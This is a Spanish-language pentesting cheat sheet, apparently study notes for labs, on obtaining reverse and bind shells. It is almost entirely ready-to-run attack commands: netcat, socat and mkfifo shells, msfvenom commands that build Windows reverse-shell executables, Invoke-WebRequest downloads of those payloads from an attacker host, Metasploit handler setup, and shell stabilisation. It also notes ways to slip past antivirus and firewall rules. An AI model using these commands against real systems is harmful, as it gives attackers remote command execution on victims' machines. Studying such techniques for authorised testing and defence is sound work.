Reverse shells

  • Tipos de reverse shell
    1. Netcat: la navaja suiza de la redes.
    2. Socat: la navaja suiza de la redes con asteroides.
    3. auxiliary/multi/handler: modulo de metasploit.
    4. /usr/share/webshells: WebShells de kali linux.
    5. Pentestmonkey: Link de descarga
    6. Reverse Shell Cheat Shell: Link de descarga
    7. Repositorio Reverse Shell: Link de descarga
  • Puertos recomendables: 80, 443 ó 53
    1. Estos puertos el listener debe ejecutarse con sudo, con esto puede que supere las reglas del firewall.


    • Bind y Reverse Netcat shells
  • Reverse shell: La victima de conecta al atacante.
    1. Creamos el listener en la maquina atacante: sudo nc -lvnp <PORT>
    2. Crear una reverse shell en el target : nc <TURN0> <PORT> -e /bin/bash
        Puede ser tambien un .exe para Windows: "cmd.exe"
    1. Opcion 2
    2. Creamos el listener en la maquina atacante: sudo nc -lvnp <PORT>
    3. Crear una reverse shell en el target : mkfifo /tmp/f; nc <TARGET> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

  • Bind shell: la victima deja un puerto en escucha para que el atacante se conecte.
    1. Crear una reverse shell en el target : nc -lvnp <PORT> -e "cmd.exe"
    2. Creamos el listener en la maquina atacante: nc <LOCAL IP> <PORT>
        Puede ser tambien un .exe para Windows: "cmd.exe"
    1. Opcion 2
    2. Crearemos una bind shell en el target: mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
    3. En nuestra maquina atacante : nc <Target> <PORT>


    • Bind y Reverse Socat shells
  • Reverse shell
    1. Creamos el listener en la maquina atacante: socat TCP-L:<PORT> - <PORT>
    2. Crear una reverse shell en el target en Linux : socat TCP:<TURN0>:<PORT> EXEC:"bash -li"
    3. Crear una reverse shell en el target en Windows : socat TCP:<TURN0>:<PORT> EXEC:powershell.exe,pipes

  • Bind shell
    1. Crear una reverse shell en el target en linux : socat TCP-L:<PORT> EXEC:"bash -li"
    2. Crear una reverse shell en el target en windows : socat TCP-L:<PORT> EXEC:powershell.exe,pipes
    3. Creamos el listener en la maquina atacante: socat TCP:<Target>:<PORT> -
    4. Cuando socat no viene instalado
    5. Por defecto Socat no viene instalado, pero podemos cargar un precompiled socat binary: Link de descarga
    6. Montar un web server, se tiene que montar donde esta guardado el socat: sudo python3 -m http.server 80
    7. Ir a windows y abrir Powershell: Invoke-WebRequest -uri <TURN0>/socat.exe -outfile C:\\Windows\temp\socat.exe
      1. Invoke-WebRequest -uri http://10.10.10.123:80/socat -outfile C:\\Windows\temp\socat.exe
    8. Comprobamos que se subio el archivo
    9. Ahora ponemos un listener con socat: socat TCP-L:<PORT> -
    10. Ahora nos vamo a windows y ejecuatamos el comando en powershell: socat TCP:<TURN0>:<PORT> EXEC:powershell.exe,pipes

    • Msfvenom
  • Staged Shell
    1. Staged: se envían en dos partes. La primera parte se llama stager. Este es un fragmento de código que se ejecuta directamente en el servidos. Se conecta de nuevo a un oyente en espera, pero en realidad no contine ningún código de Shell inverso por si mismo. En su lugar, se conecta al oyente y usa la conexión para cargar el payload real, ejecutándola directamente y evitando que toque el disco donde podría ser atrapado por las soluciones de antivirus tradicionales. Por lo tanto, la carga útil se divide en dos partes: una pequeña etapa inicial, luego el código de Shell inverso más voluminoso que de descarga cuando se activa la etapa. El payload por etapas requieren un oyente inicial especial, generalmente el manejador/multiple Metasploit, que se tratara en la siguiente tarea.
    2. Buscamos primero la shell msfvenom --list payloads | grep “<OS>/<arch>/<payload>”
      1. : msfvenom --list payloads | grep “windows/x64/meterpreter/reverse_tcp”
      2. : msfvenom --list payloads | grep “linux/x86/meterpreter_reverse_tcp"
    3. Configuramos la shell
        msfvenom -p <PAYLOAD> <OPTIONS>
    4. Generar una reverse shell:
      1. msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<turn0> LPORT=<listen-port>
      2. msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.10.10.123 LPORT=443
    5. Subimos el archivo mediante WebServer
      1. sudo python3 -m http.server 80
    6. Abrimos PowerShell en el target y descargamos la shell
      1. Invoke-WebRequest -uri http://<TURN0>:<PORT>/<reverse-file> -outfile C:\\Windows\temp\shell.exe
      2. Invoke-WebRequest -uri http://10.10.10.123:80/shell.exe -outfile C:\\Windows\temp\shell.exe
    7. Abrir metasploit
      1. msfconsole -q
      2. use multi/handler
      3. Configuramos PAYLOAD, LHOST Y LPORT
      4. set PAYLOAD <payload>
      5. set LHOST <TURN0>
      6. set LPORT <LISTEN-PORT>
      7. Ejecutamos
      8. exploit -j
    8. Nos vamos a Windows y nos metemos a la carpeta donde se almaceno la shell.exe
      1. Damos doble click al ejecutable
    9. En la consola de metasploit vemos que se cargó correctamente
    10. Nos dice que la session se cargo exitosamenr
    11. Cargamos la session
      1. sessions <session num>
      2. Entramos a la consola de Windows


  • Stagless Shell
    1. Stageless: Son los más comunes, son completamente autónomos en el sentido de que hay una pieza de código que, cuando se ejecuta, envía un Shell inmediatamente al oyente que espera.
    2. Configuramos la shell
        msfvenom -p <PAYLOAD> <OPTIONS>
    3. Generar una reverse shell:
      1. msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=<turn0> LPORT=<listen-port>
      2. msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=10.10.10.123 LPORT=443
    4. Subimos el archivo mediante WebServer
      1. sudo python3 -m http.server 80
    5. Abrimos PowerShell en el target y descargamos la shell
      1. Invoke-WebRequest -uri http://<TURN0>:<PORT>/<reverse-file> -outfile C:\\Windows\temp\shell.exe
      2. Invoke-WebRequest -uri http://10.10.10.123:80/shell.exe -outfile C:\\Windows\temp\shell.exe
    6. Habilitamos el listener en nuestra maquina atacante
      1. nc -lvp <PORT>
    7. Nos vamos a Windows y nos metemos a la carpeta donde se almaceno la shell.exe
      1. Damos doble click al ejecutable
      2. Entramos a la consola de Windows
    8. Es recomendable usuar rlwrap para poder estabilizar la shell en windows


  • rlwrap: pasos para generar una shell, nos da acceso al historia, el autocompletado de pestañas y teclas de flecha inmediatamente despues de recibir un shell, este tipo de shell es mucho mas complejo y es tecnicamente particular cuando se trata de una Shell de Windows, que son notoriamente dificiles de estabilizar.
    1. Nota se debe seguir utilizando alguna estabilizacion manual si desea usar Ctrl + C dentro del shell
    1. 1. Instalar la Shell rlwrap: sudo apt install rlwrap
    2. 2. Invocamos un oyente: rlwrap nc -lvp
    3. 3. Ejecutar el shell en segundo plano usando el comando : Ctrl + z
    4. 4. Ejecutar para que se apague el echo de nuesta terminal (solo cuando el target sea Linux): stty raw -echo; fg


    • Tratamiento de tty
  • Python
    1. 1. Ejecutar para generar un Shell Bash: python -c 'import pty;pty.spawn("/bin/bash")'
      1. Nota: algunos targets neceistan especificar la version correcta de Pyhon
      2. Reemplazar la version de Pyhon por: Pyhon, Python2 ó Python3
    2. 2. Ejecutar para generar comando como clear: export TERM=xterm
    3. 3. Ejecutar el shell en segundo plano usando el comando : Ctrl + z
    4. 4. Renovar la terminal de segundo plano: stty raw -echo; fg
      1. Tenga en cuenta que si el Shell muere, cualquier entrada en su propio terminal no será visible (como resultado de haber desactivado el echo del terminal).
      2. Solucion, escribir: reset
  • Bash
    1. 1. Ejecutar el siguiente comando
      1. script /dev/null -c bash
    2. 2. Ejecutar la siguientes teclas
      1. Ctrl +z
    3. 3. Ejecutar el siguiente comando
      1. stty -echo; fg
    4. 4. Ejecutar el siguiente comando
      1. reset
    5. 5. Nos pedira el tipo de terminal
      1. Terminal type? Xterm
    6. 6. Configuramos la terminal
      1. echo $TERM
      2. export TERM=xterm
      3. export SHELL=bash
      4. echo $TERM
      5. xterm
    7. 7. Configuracion de tamaño de pantalla
      1. stty -a
      2. speed 38400 baud; rows 24; columns 80; line = 0;
      3. stty rows 43 columns 171
